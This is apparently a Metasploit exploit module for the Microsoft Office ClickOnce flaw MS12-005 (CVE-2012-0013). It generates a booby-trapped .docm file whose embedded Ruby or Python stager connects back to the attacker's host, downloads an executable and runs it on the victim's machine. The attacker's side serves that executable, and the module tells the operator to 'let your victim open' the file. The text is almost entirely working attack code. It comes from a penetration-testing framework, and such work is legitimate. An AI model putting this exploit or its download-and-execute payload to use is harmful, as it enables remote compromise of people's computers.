# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
require &#039;rex/zip&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::EXE
    include Msf::Exploit::Remote::TcpServer
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "MS12-005 Microsoft Office ClickOnce Unsafe Object Package Handling Vulnerability",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in Microsoft Office&#039;s ClickOnce
                feature.  When handling a Macro document, the application fails to recognize
                certain file extensions as dangerous executables, which can be used to bypass
                the warning message.  This allows you to trick your victim into opening the
                malicious document, which will load up either a python or ruby payload based on
                your choosing, and then finally download and execute our executable.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Yorick Koster&#039;, #Vuln discovery
                    &#039;sinn3r&#039;         #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2012-0013&#039;],
                    [&#039;OSVDB&#039;, &#039;78207&#039;],
                    [&#039;MSB&#039;, &#039;ms12-005&#039;],
                    [&#039;BID&#039;, &#039;51284&#039;],
                    [&#039;URL&#039;, &#039;http://support.microsoft.com/default.aspx?scid=kb;EN-US;2584146&#039;],
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00"
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039;          => "none",
                    &#039;DisablePayloadHandler&#039; => &#039;false&#039;
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [&#039;Microsoft Office Word 2007/2010 on Windows 7&#039;, {}],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Jan 10 2012",
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptEnum.new(&#039;PAYLOAD_TYPE&#039;, [true, "The initial payload type", &#039;PYTHON&#039;, %w(RUBY PYTHON)]),
                    OptString.new("BODY", [false, &#039;The message for the document body&#039;, &#039;&#039;]),
                    OptString.new(&#039;FILENAME&#039;, [true, &#039;The Office document macro file&#039;, &#039;msf.docm&#039;])
                ], self.class)
    end
 
 
    #
    # Return the first-stage payload that will download our malicious executable.
    #
    def get_download_exec_payload(type, lhost, lport)
        payload_name = Rex::Text.rand_text_alpha(7)
 
        # Padd up 6 null bytes so the first few characters won&#039;t get cut off
        p = "\x00"*6
 
        case type
        when :rb
            p << %Q|
            require &#039;socket&#039;
            require &#039;tempfile&#039;
            begin
                cli = TCPSocket.open("#{lhost}",#{lport})
                buf = &#039;&#039;
                while l = cli.gets
                    buf << l
                end
                cli.close
                tmp = Tempfile.new([&#039;#{payload_name}&#039;,&#039;.exe&#039;])
                t = tmp.path
                tmp.binmode
                tmp.write(buf)
                tmp.close
                exec(t)
            rescue
            end#|
 
        when :py
            p << %Q|
            import socket
            import tempfile
            import os
 
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("#{lhost}", #{lport}))
            buf = ""
            while True:
                data = s.recv(1024)
                if data:
                    buf += data
                else:
                    break
            s.close
            temp = tempfile.gettempdir() + "\\\\\\" + "#{payload_name}.exe"
            f = open(temp, "wb")
            f.write(buf)
            f.close
            f = None
            os.system(temp)
            #|
 
        end
 
        p = p.gsub(/^\t\t\t/, &#039;&#039;)
 
        return p
    end
 
 
    #
    # Reads a file that&#039;ll be packaged.
    # This will patch certain files on the fly, or return the original content of the file.
    #
    def on_file_read(fname, file)
        f = open(file, &#039;rb&#039;)
        buf = f.read
        f.close
 
        # Modify certain files on the fly
        case file
        when /oleObject1\.bin/
            # Patch the OLE object file with our payload
            print_status("Patching OLE object")
            ptype = datastore[&#039;PAYLOAD_TYPE&#039;] == &#039;PYTHON&#039; ? :py : :rb
            p     = get_download_exec_payload(ptype, @ip, @port)
            buf   = buf.gsub(/MYPAYLOAD/, p)
 
            # Patch username
            username = Rex::Text.rand_text_alpha(5)
            buf = buf.gsub(/METASPLOIT/, username)
            buf = buf.gsub(/#{Rex::Text.to_unicode("METASPLOIT")}/, Rex::Text.to_unicode(username))
 
            # Patch the filename
            f = Rex::Text.rand_text_alpha(6)
            buf = buf.gsub(/MYFILENAME/, f)
            buf = buf.gsub(/#{Rex::Text.to_unicode("MYFILENAME")}/, Rex::Text.to_unicode(f))
 
            # Patch the extension name
            ext = ptype.to_s
            buf = buf.gsub(/MYEXT/, ext)
            buf = buf.gsub(/#{Rex::Text.to_unicode("MYEXT")}/, Rex::Text.to_unicode(ext))
 
        when /document\.xml/
            print_status("Patching document body")
            # Patch the docx body
            buf = buf.gsub(/W00TW00T/, datastore[&#039;BODY&#039;])
 
        end
 
        # The original filename of __rels is actually ".rels".
        # But for some reason if that&#039;s our original filename, it won&#039;t be included
        # in the archive. So this hacks around that.
        case fname
        when /__rels/
            fname = fname.gsub(/\_\_rels/, &#039;.rels&#039;)
        end
 
        yield fname, buf
    end
 
 
    #
    # Packages the Office Macro Document
    #
    def package_docm_rex(path)
        zip = Rex::Zip::Archive.new
 
        Dir["#{path}/**/**"].each do |file|
            p = file.sub(path+&#039;/&#039;,&#039;&#039;)
 
            if File.directory?(file)
                print_status("Packging directory: #{file}")
                zip.add_file(p)
            else
                on_file_read(p, file) do |fname, buf|
                    print_status("Packaging file: #{fname}")
                    zip.add_file(fname, buf)
                end
            end
        end
 
        zip.pack
    end
 
 
    #
    # Return the malicious executable
    #
    def on_client_connect(cli)
        print_status("#{cli.peerhost}:#{cli.peerport} - Sending executable (#{@exe.length.to_s} bytes)")
        cli.put(@exe)
        service.close_client(cli)
    end
 
 
    def exploit
        @ip    = datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039; ? Rex::Socket.source_address(&#039;50.50.50.50&#039;) : datastore[&#039;SRVHOST&#039;]
        @port  = datastore[&#039;SRVPORT&#039;]
 
        print_status("Generating our docm file...")
        path  = File.join(Msf::Config.install_root, &#039;data&#039;, &#039;exploits&#039;, &#039;CVE-2012-0013&#039;)
        docm = package_docm_rex(path)
 
        file_create(docm)
        print_good("Let your victim open #{datastore[&#039;FILENAME&#039;]}")
 
        print_status("Generating our malicious executable...")
        @exe = generate_payload_exe
 
        print_status("Ready to deliver your payload on #{@ip}:#{@port.to_s}")
        super
    end
end
 
=begin
mbp:win7_diff sinn3r$ diff patch/GetCurrentIcon.c vuln/GetCurrentIcon.c
1c1
< void *__thiscall CPackage::_GetCurrentIcon(void *this, int a2)
---
> const WCHAR *__thiscall CPackage::_GetCurrentIcon(void *this, int a2)
...
24c24
<     if ( AssocIsDangerous(result) || !SHGetFileInfoW(pszPath, 0x80u, &psfi, 0x2B4u, 0x110u) )
---
>     if ( IsProgIDInList(0, result, extList, 0x11u) || !SHGetFileInfoW(pszPath, 0x80u, &psfi, 0x2B4u, 0x110u) )
31c31
=end



